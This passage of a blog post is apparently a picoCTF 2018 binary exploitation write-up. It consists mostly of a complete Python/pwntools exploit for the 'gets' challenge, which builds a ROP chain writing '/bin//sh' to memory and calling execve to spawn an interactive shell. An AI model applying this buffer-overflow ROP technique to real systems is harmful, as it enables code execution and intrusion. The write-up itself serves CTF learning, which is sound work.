	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x0807ab7f<span style=color:#ff79c6>)</span> <span style=color:#6272a4># inc eax ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x0807ab7f<span style=color:#ff79c6>)</span> <span style=color:#6272a4># inc eax ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x0807ab7f<span style=color:#ff79c6>)</span> <span style=color:#6272a4># inc eax ; ret</span>
	<span style=color:#8be9fd;font-style:italic>p</span> <span style=color:#ff79c6>+=</span> pack<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, 0x0806cd95<span style=color:#ff79c6>)</span> <span style=color:#6272a4># int 0x80</span>
</code></pre></td></tr></table>
</div>
</div><p>Full exploit:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6272a4>#!/usr/bin/env python</span>
<span style=color:#ff79c6>import</span> struct
<span style=color:#ff79c6>from</span> pwn <span style=color:#ff79c6>import</span> <span style=color:#ff79c6>*</span>


<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_offset</span>(eip):
    <span style=color:#6272a4>#print cyclic(150)</span>
    eip <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;aaah&#39;</span>    <span style=color:#6272a4>#obtain with dmesg | tail -1</span>
    eip <span style=color:#ff79c6>=</span> eip[::<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>] <span style=color:#6272a4>#reverse the eip bicause of little endianness</span>
    <span style=color:#ff79c6>return</span> cyclic_find(eip)

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_rop</span>(offset):
        <span style=color:#6272a4># Padding goes here</span>
        p <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;</span>

        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x0806f19a</span>) <span style=color:#6272a4># pop edx ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x080ea060</span>) <span style=color:#6272a4># @ .data</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x080b84d6</span>) <span style=color:#6272a4># pop eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>&#39;/bin&#39;</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x08054b4b</span>) <span style=color:#6272a4># mov dword ptr [edx], eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x0806f19a</span>) <span style=color:#6272a4># pop edx ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x080ea064</span>) <span style=color:#6272a4># @ .data + 4</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x080b84d6</span>) <span style=color:#6272a4># pop eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>&#39;//sh&#39;</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x08054b4b</span>) <span style=color:#6272a4># mov dword ptr [edx], eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x0806f19a</span>) <span style=color:#6272a4># pop edx ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x080ea068</span>) <span style=color:#6272a4># @ .data + 8</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x08049473</span>) <span style=color:#6272a4># xor eax, eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x08054b4b</span>) <span style=color:#6272a4># mov dword ptr [edx], eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x080481c9</span>) <span style=color:#6272a4># pop ebx ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x080ea060</span>) <span style=color:#6272a4># @ .data</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x080dece1</span>) <span style=color:#6272a4># pop ecx ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x080ea068</span>) <span style=color:#6272a4># @ .data + 8</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x0806f19a</span>) <span style=color:#6272a4># pop edx ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x080ea068</span>) <span style=color:#6272a4># @ .data + 8</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x08049473</span>) <span style=color:#6272a4># xor eax, eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x0807ab7f</span>) <span style=color:#6272a4># inc eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x0807ab7f</span>) <span style=color:#6272a4># inc eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x0807ab7f</span>) <span style=color:#6272a4># inc eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x0807ab7f</span>) <span style=color:#6272a4># inc eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x0807ab7f</span>) <span style=color:#6272a4># inc eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x0807ab7f</span>) <span style=color:#6272a4># inc eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x0807ab7f</span>) <span style=color:#6272a4># inc eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x0807ab7f</span>) <span style=color:#6272a4># inc eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x0807ab7f</span>) <span style=color:#6272a4># inc eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x0807ab7f</span>) <span style=color:#6272a4># inc eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x0807ab7f</span>) <span style=color:#6272a4># inc eax ; ret</span>
        p <span style=color:#ff79c6>+=</span> struct<span style=color:#ff79c6>.</span>pack(<span style=color:#f1fa8c>&#39;&lt;I&#39;</span>, <span style=color:#bd93f9>0x0806cd95</span>) <span style=color:#6272a4># int 0x80</span>

        <span style=color:#ff79c6>return</span> fit({offset : p})

offset <span style=color:#ff79c6>=</span> get_offset(eip)
<span style=color:#8be9fd;font-style:italic>print</span> offset
ropchain <span style=color:#ff79c6>=</span> get_rop(offset)

p <span style=color:#ff79c6>=</span> process(<span style=color:#f1fa8c>&#39;./gets&#39;</span>)
p<span style=color:#ff79c6>.</span>sendlineafter(<span style=color:#f1fa8c>&#34;GIVE ME YOUR NAME!</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>, ropchain)
p<span style=color:#ff79c6>.</span>interactive()
</code></pre></td></tr></table>
</div>
</div><h2 id=freecalc>freecalc</h2>
<h2 id=sword>sword</h2>
<h2 id=contacts>Contacts</h2>
</div>
</article>
<hr>
<div class=sharing-buttons>
<a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xade1.github.io%2fposts%2f2019%2f12%2fpicoctf-2018-binary-exploitation%2f" target=_blank rel=noopener aria-label title="Share on facebook">
<div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2019%2f12%2fpicoctf-2018-binary-exploitation%2f" target=_blank rel=noopener aria-label title="Share on twitter">
<div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
<div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="https://www.tumblr.com/widgets/share/tool?posttype=link&title=picoCTF%202018%20-%20Binary%20Exploitation&caption=picoCTF%202018%20-%20Binary%20Exploitation&canonicalUrl=https%3a%2f%2f0xade1.github.io%2fposts%2f2019%2f12%2fpicoctf-2018-binary-exploitation%2f" target=_blank rel=noopener aria-label title="Share on tumblr">
<div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
<div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093.0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941.0 9.999.0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="mailto:?subject=picoCTF%202018%20-%20Binary%20Exploitation&body=https%3a%2f%2f0xade1.github.io%2fposts%2f2019%2f12%2fpicoctf-2018-binary-exploitation%2f" target=_self rel=noopener aria-label title="Share via email">
<div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2019%2f12%2fpicoctf-2018-binary-exploitation%2f&media=https%3a%2f%2f0xade1.github.io%2fposts%2f2019%2f12%2fpicoctf-2018-binary-exploitation%2f;description=picoCTF%202018%20-%20Binary%20Exploitation" target=_blank rel=noopener aria-label title="Share on pinterest">
<div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12.017.0C5.396.0.029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024.0 1.518.769 1.518 1.688.0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128.0 3.768-2.245 3.768-5.487.0-2.861-2.063-4.869-5.008-4.869-3.41.0-5.409 2.562-5.409 5.199.0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646.0-3.776 2.748-7.252 7.92-7.252 4.158.0 7.392 2.967 7.392 6.923.0 4.135-2.607 7.462-6.233 7.462-1.214.0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607.0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017.0z"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2f0xade1.github.io%2fposts%2f2019%2f12%2fpicoctf-2018-binary-exploitation%2f&title=picoCTF%202018%20-%20Binary%20Exploitation&summary=picoCTF%202018%20-%20Binary%20Exploitation&source=https%3a%2f%2f0xade1.github.io%2fposts%2f2019%2f12%2fpicoctf-2018-binary-exploitation%2f" target=_blank rel=noopener aria-label title="Share on linkedin">
<div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2019%2f12%2fpicoctf-2018-binary-exploitation%2f&resubmit=true&title=picoCTF%202018%20-%20Binary%20Exploitation" target=_blank rel=noopener aria-label title="Share on reddit">
<div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xade1.github.io%2fposts%2f2019%2f12%2fpicoctf-2018-binary-exploitation%2f;title=picoCTF%202018%20-%20Binary%20Exploitation" target=_blank rel=noopener aria-label title="Share on xing">
<div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M18.188.0c-.517.0-.741.325-.927.66.0.0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211.0.375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016.0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894.0 21.686.0h-3.498zM3.648 4.74c-.211.0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016.0.021L1.86 16.051c-.099.188-.093.381.0.529.085.142.239.234.45.234h3.461c.518.0.766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="whatsapp://send?text=picoCTF%202018%20-%20Binary%20Exploitation%20https%3a%2f%2f0xade1.github.io%2fposts%2f2019%2f12%2fpicoctf-2018-binary-exploitation%2f" target=_blank rel=noopener aria-label title="Share on whatsapp">
<div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xade1.github.io%2fposts%2f2019%2f12%2fpicoctf-2018-binary-exploitation%2f&t=picoCTF%202018%20-%20Binary%20Exploitation" target=_blank rel=noopener aria-label title="Share on hacker news">
<div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="https://telegram.me/share/url?text=picoCTF%202018%20-%20Binary%20Exploitation&url=https%3a%2f%2f0xade1.github.io%2fposts%2f2019%2f12%2fpicoctf-2018-binary-exploitation%2f" target=_blank rel=noopener aria-label title="Share on telegram">
<div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
</div>
</div>
</a>
</div>
<hr>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h></span>
</div>
<div class=pagination__buttons>
<a href=https://0xade1.github.io/posts/2019/12/picoctf-2018-cryptography/ class="button previous">
<span class=button__icon>←</span>
<span class=button__text>picoCTF 2018 - Cryptography</span>
</a>
<a href=https://0xade1.github.io/posts/2019/12/kringlecon-2019/ class="button next">
<span class=button__text>Kringlecon 2019</span>
<span class=button__icon>→</span>
</a>
</div>
</div>
<hr>
</main>
</div>
<footer class=footer>
<div class=footer__inner>
<div class=footer__content>
<span>&copy; 2021</span>
<span><a href=https://0xade1.github.io/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span>
</div>
</div>
<div class=footer__inner>
<div class=footer__content>
<span>Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>Made with &#10084;</span>
</div>
</div>
</footer>
</div>
